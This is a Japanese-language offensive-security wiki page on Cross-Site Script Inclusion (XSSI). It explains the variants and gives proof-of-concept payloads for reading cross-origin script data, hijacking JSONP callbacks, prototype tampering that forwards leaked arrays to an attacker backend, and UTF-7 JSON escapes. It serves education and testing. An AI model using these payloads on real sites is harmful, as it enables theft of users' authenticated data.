# XSSI (Cross-Site Script Inclusion)

{{#include ../banners/hacktricks-training.md}}

## 基本情報

**Cross-Site Script Inclusion (XSSI)** は、HTMLの `script` タグの性質から生じる脆弱性です。ほとんどのリソースが **Same-Origin Policy (SOP)** の対象であるのに対し、スクリプトは異なるドメインから含めることができます。この動作は、異なるサーバーにホストされているライブラリや他のリソースの使用を促進することを目的としていますが、潜在的なセキュリティリスクも引き起こします。

### **XSSI** の主な特徴:

- **SOPのバイパス**: スクリプトは **Same-Origin Policy** から免除されており、ドメインを越えて含めることができます。
- **データの露出**: 攻撃者はこの動作を利用して、`script` タグを介して読み込まれたデータを読み取ることができます。
- **動的JavaScript/JSONPへの影響**: **XSSI** は特に動的JavaScriptや **JSON with Padding (JSONP)** に関連しています。これらの技術は、認証のために「環境権限」情報（クッキーなど）を使用することがよくあります。異なるホストへのスクリプトリクエストが行われると、これらの資格情報（例：クッキー）が自動的にリクエストに含まれます。
- **認証トークンの漏洩**: 攻撃者がユーザーのブラウザを騙して、自分が制御するサーバーからスクリプトをリクエストさせることができれば、これらのリクエストに含まれる機密情報にアクセスできる可能性があります。

### タイプ

1. **静的JavaScript** - これはXSSIの従来の形式を表します。
2. **認証付き静的JavaScript** - このタイプは、アクセスするために認証が必要であるため、異なります。
3. **動的JavaScript** - コンテンツを動的に生成するJavaScriptを含みます。
4. **非JavaScript** - JavaScriptを直接含まない脆弱性を指します。

**以下の情報は [https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414) の要約です。詳細については確認してください。**

### 通常のXSSI

このアプローチでは、プライベート情報がグローバルにアクセス可能なJavaScriptファイルに埋め込まれています。攻撃者は、ファイルの読み取り、キーワード検索、または正規表現などの方法を使用してこれらのファイルを特定できます。一度見つかると、プライベート情報を含むスクリプトは悪意のあるコンテンツに含められ、機密データへの不正アクセスを可能にします。以下に例示された悪用技術があります:
```html
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script>
alert(JSON.stringify(confidential_keys[0]))
</script>
```
### Dynamic-JavaScript-based-XSSI and Authenticated-JavaScript-XSSI

これらのタイプのXSSI攻撃は、ユーザーのリクエストに応じて機密情報が動的にスクリプトに追加されることを含みます。検出は、クッキーありとなしでリクエストを送信し、レスポンスを比較することで行うことができます。情報が異なる場合、機密情報が存在する可能性を示すことがあります。このプロセスは、[DetectDynamicJS](https://github.com/luh2/DetectDynamicJS) Burp拡張機能のようなツールを使用して自動化できます。

機密データがグローバル変数に保存されている場合、通常のXSSIで使用されるのと同様の方法を使用して悪用することができます。ただし、機密データがJSONPレスポンスに含まれている場合、攻撃者はコールバック関数をハイジャックして情報を取得することができます。これは、グローバルオブジェクトを操作するか、JSONPレスポンスによって実行される関数を設定することで行うことができます。以下に示します:
```html
<script>
var angular = function () {
return 1
}
angular.callbacks = function () {
return 1
}
angular.callbacks._7 = function (leaked) {
alert(JSON.stringify(leaked))
}
</script>
<script
src="https://site.tld/p?jsonp=angular.callbacks._7"
type="text/javascript"></script>
```

```html
<script>
leak = function (leaked) {
alert(JSON.stringify(leaked))
}
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```
グローバル名前空間に存在しない変数に対して、_prototype tampering_ が時々悪用されることがあります。この技術は、呼び出されたプロパティを見つけるためにプロトタイプチェーンをたどるコード解釈を含むJavaScriptの設計を利用します。`Array`の`slice`のような特定の関数をオーバーライドすることで、攻撃者は非グローバル変数にアクセスし、漏洩させることができます：
```javascript
Array.prototype.slice = function () {
// leaks ["secret1", "secret2", "secret3"]
sendToAttackerBackend(this)
}
```
攻撃ベクターに関する詳細は、セキュリティ研究者 [Sebastian Lekies](https://twitter.com/slekies) の研究に見られ、彼は [vectors](http://sebastian-lekies.de/leak/) のリストを維持しています。

### Non-Script-XSSI

寺田武の研究は、CSVなどのNon-Scriptファイルが`script`タグのソースとして含まれることによって、クロスオリジンで漏洩する別の形のXSSIを紹介しています。2006年のジェレミア・グロスマンによる完全なGoogleアドレス帳を読み取る攻撃や、2007年のジョー・ウォーカーによるJSONデータ漏洩など、XSSIの歴史的な事例は、これらの脅威の深刻さを浮き彫りにしています。さらに、ギャレス・ヘイズは、特定のブラウザで効果的なJSON形式から脱出し、スクリプトを実行するためにUTF-7エンコードされたJSONを使用する攻撃のバリアントについて説明しています。
```javascript
;[
{
friend: "luke",
email:
"+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-",
},
]
```

```html
<script
src="http://site.tld/json-utf7.json"
type="text/javascript"
charset="UTF-7"></script>
```
{{#include ../banners/hacktricks-training.md}}
